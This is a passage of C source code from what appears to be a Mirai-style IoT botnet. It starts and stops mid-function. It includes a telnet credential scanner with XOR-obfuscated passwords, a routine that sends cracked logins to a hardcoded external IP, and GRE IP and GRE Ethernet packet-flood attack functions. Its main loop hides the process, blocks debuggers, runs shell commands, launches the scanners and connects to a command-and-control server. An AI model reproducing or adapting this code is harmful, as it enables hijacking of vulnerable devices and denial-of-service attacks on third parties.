    int i, prompt_ending = -1;

    for (i = conn->rdbuf_pos - 1; i > 0; i--)
    {
        if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
        {
            prompt_ending = i + 1;
            break;
        }
    }

    if (prompt_ending == -1)
    {
		int tmp, len;
		char *assword;
		
		table_unlock_val(TABLE_SCAN_ASSWORD);
		
		assword = table_retrieve_val(TABLE_SCAN_ASSWORD, &len);
		
        if ((tmp = util_memsearch(conn->rdbuf, conn->rdbuf_pos, assword, len - 1) != -1))
            prompt_ending = tmp;
    }
		table_lock_val(TABLE_SCAN_ASSWORD);
		
    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static int consume_resp_prompt(struct scanner_connection *conn)
{
    char *tkn_resp;
    int prompt_ending, len;

    table_unlock_val(TABLE_SCAN_NCORRECT);
    tkn_resp = table_retrieve_val(TABLE_SCAN_NCORRECT, &len);
    if (util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1) != -1)
    {
        table_lock_val(TABLE_SCAN_NCORRECT);
        return -1;
    }
    table_lock_val(TABLE_SCAN_NCORRECT);

    table_unlock_val(TABLE_SCAN_RESP);
    tkn_resp = table_retrieve_val(TABLE_SCAN_RESP, &len);
    prompt_ending = util_memsearch(conn->rdbuf, conn->rdbuf_pos, tkn_resp, len - 1);
    table_lock_val(TABLE_SCAN_RESP);

    if (prompt_ending == -1)
        return 0;
    else
        return prompt_ending;
}

static void add_auth_entry(char *enc_user, char *enc_pass, uint16_t weight)
{
    int tmp;

    auth_table = realloc(auth_table, (auth_table_len + 1) * sizeof (struct scanner_auth));
    auth_table[auth_table_len].username = deobf(enc_user, &tmp);
    auth_table[auth_table_len].username_len = (uint8_t)tmp;
    auth_table[auth_table_len].password = deobf(enc_pass, &tmp);
    auth_table[auth_table_len].password_len = (uint8_t)tmp;
    auth_table[auth_table_len].weight_min = auth_table_max_weight;
    auth_table[auth_table_len++].weight_max = auth_table_max_weight + weight;
    auth_table_max_weight += weight;
}

static struct scanner_auth *random_auth_entry(void)
{
    int i;
    uint16_t r = (uint16_t)(rand_next() % auth_table_max_weight);

    for (i = 0; i < auth_table_len; i++)
    {
        if (r < auth_table[i].weight_min)
            continue;
        else if (r < auth_table[i].weight_max)
            return &auth_table[i];
    }

    return NULL;
}

static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
{
    struct sockaddr_in addr;
    int pid = fork(), fd;

    if (pid > 0 || pid == -1)
        return;

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to call socket()\n");
#endif
        exit(0);
    }
    
    table_unlock_val(TABLE_SCAN_CB_PORT);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(185,246,152,173);
    addr.sin_port = *((port_t *)table_retrieve_val(TABLE_SCAN_CB_PORT, NULL));
    table_lock_val(TABLE_SCAN_CB_PORT);

    if (connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
#ifdef DEBUG
        printf("[report] Failed to connect to scanner callback!\n");
#endif
        close(fd);
        exit(0);
    }

    uint8_t zero = 0;
    send(fd, &zero, sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, &daddr, sizeof (ipv4_t), MSG_NOSIGNAL);
    send(fd, &dport, sizeof (uint16_t), MSG_NOSIGNAL);
    send(fd, &(auth->username_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->username, auth->username_len, MSG_NOSIGNAL);
    send(fd, &(auth->password_len), sizeof (uint8_t), MSG_NOSIGNAL);
    send(fd, auth->password, auth->password_len, MSG_NOSIGNAL);

#ifdef DEBUG
    printf("[report] Send scan result to loader\n");
#endif

    close(fd);
    exit(0);
}

static char *deobf(char *str, int *len)
{
    int i;
    char *cpy;

    *len = util_strlen(str);
    cpy = malloc(*len + 1);

    util_memcpy(cpy, str, *len + 1);

    for (i = 0; i < *len; i++)
    {
        cpy[i] ^= 0x13;
        cpy[i] ^= 0x37;
        cpy[i] ^= 0xC0;
        cpy[i] ^= 0xD3;
    }

    return cpy;
}

static BOOL can_consume(struct scanner_connection *conn, uint8_t *ptr, int amount)
{
    uint8_t *end = conn->rdbuf + conn->rdbuf_pos;

    return ptr + amount < end;
}

#endif
#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <limits.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>

#include "includes.h"
#include "util.h"
#include "table.h"

int util_strlen(char *str)
{
    int c = 0;

    while(*str++ != 0)
        c++;

    return c;
}


BOOL util_strncmp(char *str1, char *str2, int len)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if(l1 < len || l2 < len)
        return FALSE;

    while(len--)
    {
        if(*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

BOOL util_strcmp(char *str1, char *str2)
{
    int l1 = util_strlen(str1), l2 = util_strlen(str2);

    if(l1 != l2)
        return FALSE;

    while(l1--)
    {
        if(*str1++ != *str2++)
            return FALSE;
    }

    return TRUE;
}

int util_strcpy(char *dst, char *src)
{
    int l = util_strlen(src);

    util_memcpy(dst, src, l + 1);

    return l;
}

void util_strcat(char *dest, char *src)
{
    while(*dest != '\0')
        *dest++;
    do
    {
        *dest++ = *src++;
    }
    while(*src != '\0');
}

void util_memcpy(void *dst, void *src, int len)
{
    char *r_dst = (char *)dst;
    char *r_src = (char *)src;
    while(len--)
        *r_dst++ = *r_src++;
}

void util_zero(void *buf, int len)
{
    char *zero = buf;
    while(len--)
        *zero++ = 0;
}

int util_atoi(char *str, int base)
{
	unsigned long acc = 0;
	int c;
	unsigned long cutoff;
	int neg = 0, any, cutlim;

	do
    {
		c = *str++;
	}
    while(util_isspace(c));
	
    if(c == '-')
    {
		neg = 1;
		c = *str++;
	}
    else if(c == '+')
		c = *str++;

	cutoff = neg ? -(unsigned long)LONG_MIN : LONG_MAX;
	cutlim = cutoff % (unsigned long)base;
	cutoff /= (unsigned long)base;
	for(acc = 0, any = 0;; c = *str++)
    {
		if(util_isdigit(c))
			c -= '0';
		else if(util_isalpha(c))
			c -= util_isupper(c) ? 'A' - 10 : 'a' - 10;
		else
			break;
            
		if(c >= base)
			break;

		if(any < 0 || acc > cutoff || acc == cutoff && c > cutlim)
			any = -1;
		else
        {
			any = 1;
			acc *= base;
			acc += c;
		}
	}

	if(any < 0)
    {
		acc = neg ? LONG_MIN : LONG_MAX;
	}
    else if(neg)
		acc = -acc;

    return (acc);
}

char *util_itoa(int value, int radix, char *string)
{
    if(string == NULL)
        return NULL;

    if(value != 0)
    {
        char scratch[34];
        int neg = 0;
        int offset = 0;
        int c = 0;
        unsigned int accum;

        offset = 32;
        scratch[33] = 0;

        if(radix == 10 && value < 0)
        {
            neg = 1;
            accum = -value;
        }
        else
        {
            neg = 0;
            accum = (unsigned int)value;
        }

        while(accum)
        {
            c = accum % radix;
            if(c < 10)
                c += '0';
            else
                c += 'A' - 10;

            scratch[offset] = c;
            accum /= radix;
            offset--;
        }

        if(neg)
            scratch[offset] = '-';
        else
            offset++;

        util_strcpy(string, &scratch[offset]);
    }
    else
    {
        string[0] = '0';
        string[1] = 0;
    }

    return string;
}

int util_memsearch(char *buf, int buf_len, char *mem, int mem_len)
{
    int i = 0, matched = 0;

    if(mem_len > buf_len)
        return -1;

    for(i = 0; i < buf_len; i++)
    {
        if(buf[i] == mem[matched])
        {
            if(++matched == mem_len)
                return i + 1;
        }
        else
            matched = 0;
    }

    return -1;
}

int util_stristr(char *haystack, int haystack_len, char *str)
{
    char *ptr = haystack;
    int str_len = util_strlen(str);
    int match_count = 0;

    while(haystack_len-- > 0)
    {
        char a = *ptr++;
        char b = str[match_count];
        a = a >= 'A' && a <= 'Z' ? a | 0x60 : a;
        b = b >= 'A' && b <= 'Z' ? b | 0x60 : b;

        if(a == b)
        {
            if(++match_count == str_len)
                return (ptr - haystack);
        }
        else
            match_count = 0;
    }

    return -1;
}

ipv4_t util_local_addr(void)
{
    int fd = 0;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);

    errno = 0;
    if((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[util] Failed to call socket(), errno = %d\n", errno);
        #endif
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);

    return addr.sin_addr.s_addr;
}

char *util_fdgets(char *buffer, int buffer_size, int fd)
{
    int got = 0, total = 0;
    do
    {
        got = read(fd, buffer + total, 1);
        total = got == 1 ? total + 1 : total;
    }
    while(got == 1 && total < buffer_size && *(buffer + (total - 1)) != '\n');

    return total == 0 ? NULL : buffer;
}

static inline int util_isupper(char c)
{
    return (c >= 'A' && c <= 'Z');
}

static inline int util_isalpha(char c)
{
    return ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z'));
}

static inline int util_isspace(char c)
{
    return (c == ' ' || c == '\t' || c == '\n' || c == '\12');
}

static inline int util_isdigit(char c)
{
    return (c >= '0' && c <= '9');
}
#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/if_ether.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "protocol.h"
#include "util.h"
#include "checksum.h"
#include "rand.h"

void attack_gre_ip(int duration, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    #ifdef DEBUG
        printf("[attack] In greip\n");
        return;
    #endif
    int i = 0, fd = 0;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    int time_end = time(NULL) + duration;

    if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        #ifdef DEBUG
            printf("[attack] failed to create raw socket. Aborting attack\n");
        #endif
        return;
    }
    i = 1;
    if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        #ifdef DEBUG
            printf("[attack] failed to set IP_HDRINCL. Aborting\n");
        #endif
        close(fd);
        return;
    }

    for(i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct grehdr *greh;
        struct iphdr *greiph;
        struct udphdr *udph;

        pkts[i] = calloc(1510, sizeof(char *));
        iph = (struct iphdr *)(pkts[i]);
        greh = (struct grehdr *)(iph + 1);
        greiph = (struct iphdr *)(greh + 1);
        udph = (struct udphdr *)(greiph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if(dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_GRE;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        greh->protocol = htons(ETH_P_IP);

        greiph->version = 4;
        greiph->ihl = 5;
        greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        greiph->id = htons(~ip_ident);
        greiph->ttl = ip_ttl;
        if(dont_frag)
            greiph->frag_off = htons(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        if(gcip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = ~(greiph->saddr - 1024);

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + data_len);
    }

    while(TRUE)
    {
        for(i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct iphdr *greiph = (struct iphdr *)(greh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);

            if(targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if(source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if(ip_ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if(sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if(dport == 0xffff)
                udph->dest = rand_next() & 0xffff;

            if(!gcip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;

            if(data_rand)
            {
                rand_alpha_str(data, data_len);
                data[data_len] = 0;
            }

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof(struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof(struct udphdr) + data_len);

            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }
        
        if(time(NULL) > time_end)
            break;
    }
}

void attack_gre_eth(int duration, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    #ifdef DEBUG
        printf("[attack] In greeth\n");
        return;
    #endif
    int i = 0, fd = 0;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 64);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, TRUE);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    BOOL gcip = attack_get_opt_int(opts_len, opts, ATK_OPT_GRE_CONSTIP, FALSE);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    int time_end = time(NULL) + duration;

    if((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        #ifdef DEBUG
            printf("[attack] failed to create raw socket. Aborting attack\n");
        #endif
        return;
    }
    i = 1;
    if(setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        #ifdef DEBUG
            printf("[attack] failed to set IP_HDRINCL. Aborting\n");
        #endif
        close(fd);
        return;
    }

    for(i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct grehdr *greh;
        struct ethhdr *ethh;
        struct iphdr *greiph;
        struct udphdr *udph;
        uint32_t ent1, ent2, ent3;

        pkts[i] = calloc(1510, sizeof(char *));
        iph = (struct iphdr *)(pkts[i]);
        greh = (struct grehdr *)(iph + 1);
        ethh = (struct ethhdr *)(greh + 1);
        greiph = (struct iphdr *)(ethh + 1);
        udph = (struct udphdr *)(greiph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        iph->id = htons(ip_ident);
        iph->ttl = ip_ttl;
        if(dont_frag)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_GRE;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        greh->protocol = htons(PROTO_GRE_TRANS_ETH);

        ethh->h_proto = htons(ETH_P_IP);

        greiph->version = 4;
        greiph->ihl = 5;
        greiph->tos = ip_tos;
        greiph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        greiph->id = htons(~ip_ident);
        greiph->ttl = ip_ttl;
        if(dont_frag)
            greiph->frag_off = htons(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        if(gcip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = ~(greiph->saddr - 1024);

        udph->source = htons(sport);
        udph->dest = htons(dport);
        udph->len = htons(sizeof(struct udphdr) + data_len);
    }

    while(TRUE)
    {
        for(i = 0; i < targs_len; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct ethhdr *ethh = (struct ethhdr *)(greh + 1);
            struct iphdr *greiph = (struct iphdr *)(ethh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);
            uint32_t ent1, ent2, ent3;

            if(targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

            if(source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if(ip_ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }
            if(sport == 0xffff)
                udph->source = rand_next() & 0xffff;
            if(dport == 0xffff)
                udph->dest = rand_next() & 0xffff;

            if(!gcip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;

            ent1 = rand_next();
            ent2 = rand_next();
            ent3 = rand_next();
            util_memcpy(ethh->h_dest, (char *)&ent1, 4);
            util_memcpy(ethh->h_source, (char *)&ent2, 4);
            util_memcpy(ethh->h_dest + 4, (char *)&ent3, 2);
            util_memcpy(ethh->h_source + 4, (((char *)&ent3)) + 2, 2);

            if(data_rand)
            {
                rand_alpha_str(data, data_len);
                data[data_len] = 0;
            }

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof(struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof(struct udphdr) + data_len);

            targs[i].sock_addr.sin_family = AF_INET;
            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
            targs[i].sock_addr.sin_port = 0;
            sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
        }

        if(time(NULL) > time_end)
            break;
    }
}
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <linux/ip.h>

#include "includes.h"
#include "checksum.h"

uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for(sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if(count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while(len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if(len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while(sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}
#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "resolv.h"
#include "killer.h"
#include "scanner.h"
#include "util.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static BOOL unlock_tbl_if_nodebug(char *);

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, ioctl_pid = 0;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;

#ifdef DEBUG
    static void segv_handler(int sig, siginfo_t *si, void *unused)
    {
        printf("got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
        exit(EXIT_FAILURE);
    }
#endif

#ifdef WICKED_SYSCMD
static void system_command(void)
{
    char *tbl_tmp_write, *tbl_nodir_write, *tbl_root_write, *tbl_home_write;
    int tbl_tmp_write_len = 0, tbl_nodir_write_len = 0, tbl_root_write_len = 0, tbl_home_write_len = 0;
	
    table_unlock_val(TABLE_TEXT_TMP);
    table_unlock_val(TABLE_TEXT_NODIR);
    table_unlock_val(TABLE_TEXT_ROOT);
    table_unlock_val(TABLE_TEXT_HOME);
	
    tbl_tmp_write = table_retrieve_val(TABLE_TEXT_TMP, &tbl_tmp_write_len);
    tbl_nodir_write = table_retrieve_val(TABLE_TEXT_NODIR, &tbl_nodir_write_len);
    tbl_root_write = table_retrieve_val(TABLE_TEXT_ROOT, &tbl_root_write_len);
    tbl_home_write = table_retrieve_val(TABLE_TEXT_HOME, &tbl_home_write_len);
	
    system(tbl_tmp_write);
    system(tbl_nodir_write);
    system(tbl_root_write);
    system(tbl_home_write);
	
    table_lock_val(TABLE_TEXT_TMP);
    table_lock_val(TABLE_TEXT_NODIR);
    table_lock_val(TABLE_TEXT_ROOT);
    table_lock_val(TABLE_TEXT_HOME);
}
#endif

#ifdef WICKED_IOCTL
void ioctl_keepalive(void)
{
    ioctl_pid = fork();
    if(ioctl_pid > 0 || ioctl_pid == -1)
        return;

    int timeout = 1;
    int ioctl_fd = 0;
    int found = FALSE;

    table_unlock_val(TABLE_IOCTL_KEEPALIVE1);
    table_unlock_val(TABLE_IOCTL_KEEPALIVE2);
    table_unlock_val(TABLE_IOCTL_KEEPALIVE3);
    table_unlock_val(TABLE_IOCTL_KEEPALIVE4);	

    if((ioctl_fd = open(table_retrieve_val(TABLE_IOCTL_KEEPALIVE1, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_IOCTL_KEEPALIVE2, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_IOCTL_KEEPALIVE3, NULL), 2)) != -1 ||
       (ioctl_fd = open(table_retrieve_val(TABLE_IOCTL_KEEPALIVE4, NULL), 2)) != -1)
    {
        #ifdef DEBUG
            printf("[ioctl_call] found a driver on the drvice\n");
        #endif
        found = TRUE;
        ioctl(ioctl_fd, 0x80045704, &timeout);
    }
    
    if(found)
    {
        while(TRUE)
        {
            #ifdef DEBUG
                printf("[ioctl_call] sending keep-alive ioctl call to the driver\n");
            #endif
            ioctl(ioctl_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    
    table_lock_val(TABLE_IOCTL_KEEPALIVE1);
    table_lock_val(TABLE_IOCTL_KEEPALIVE2);
    table_lock_val(TABLE_IOCTL_KEEPALIVE3);
    table_lock_val(TABLE_IOCTL_KEEPALIVE4);

    #ifdef DEBUG
        printf("[ioctl_call] driver not found.\n");
    #endif
    
    exit(0);
}
#endif

int main(int argc, char **args)
{
    char *tbl_exec_succ, name_buf[32], id_buf[32];
    int name_buf_len = 0, tbl_exec_succ_len = 0, pgid = 0, pings = 0;

    #ifndef DEBUG
        sigset_t sigs;
        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
        signal(SIGTRAP, &anti_gdb_entry);
    #endif

    #ifdef DEBUG
        printf("DEBUG MODE YO\n");

        sleep(1);

        struct sigaction sa;

        sa.sa_flags = SA_SIGINFO;
        sigemptyset(&sa.sa_mask);
        sa.sa_sigaction = segv_handler;
        if(sigaction(SIGSEGV, &sa, NULL) == -1)
            perror("sigaction");

        sa.sa_flags = SA_SIGINFO;
        sigemptyset(&sa.sa_mask);
        sa.sa_sigaction = segv_handler;
        if(sigaction(SIGBUS, &sa, NULL) == -1)
            perror("sigaction");
    #endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
    srv_addr.sin_port = htons(FAKE_CNC_PORT);

    table_init();
    anti_gdb_entry(0);
    rand_init();

	
    util_zero(id_buf, 32);
    if(argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    name_buf_len = (rand_next() % (20 - util_strlen(args[0]))) + util_strlen(args[0]);
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);

    util_zero(name_buf, 32);

    name_buf_len = (rand_next() % (20 - util_strlen(args[0]))) + util_strlen(args[0]);
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);

    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);
#ifdef WICKED_IOCTL
    ioctl_keepalive();
#endif
    attack_init();
	
#ifndef DEBUG
    if (fork() > 0)
        return 0;
    pgid = setsid();
    close(STDIN);
    close(STDOUT);
    close(STDERR);
#endif

#ifdef WICKED_SYSCMD
    system_command();
#endif
#ifdef WICKED_KILLER
    killer_init();
#endif
#ifdef WICKED_IOCTL
    ioctl_keepalive();
#endif
#ifdef WICKED_SCANNER
#ifdef WICKED_SERVER
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
#else
    scanner_init();
    scanner_init();
    scanner_init();
    scanner_init();
#endif
#endif
    attack_init();

    while (TRUE)
    {
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1)
            establish_connection();
	

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 10s in call to select()
        timeo.tv_usec = 0;
        timeo.tv_sec = 10;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
#ifdef DEBUG
            printf("select() errno = %d\n", errno);
#endif
            continue;
        }
        else if (nfds == 0)
        {
            uint16_t len = 0;

            if (pings++ % 6 == 0)
                send(fd_serv, &len, sizeof (len), MSG_NOSIGNAL);
        }

        if(pending_connection)
        {
            pending_connection = FALSE;

            if(!FD_ISSET(fd_serv, &fdsetwr))
            {
                #ifdef DEBUG
                    printf("[main] timed out while connecting to CNC\n");
                #endif
                teardown_connection();
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err != 0)
                {
                    #ifdef DEBUG
                        printf("[main] error while connecting to CNC code=%d\n", err);
                    #endif
                    close(fd_serv);
                    fd_serv = -1;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
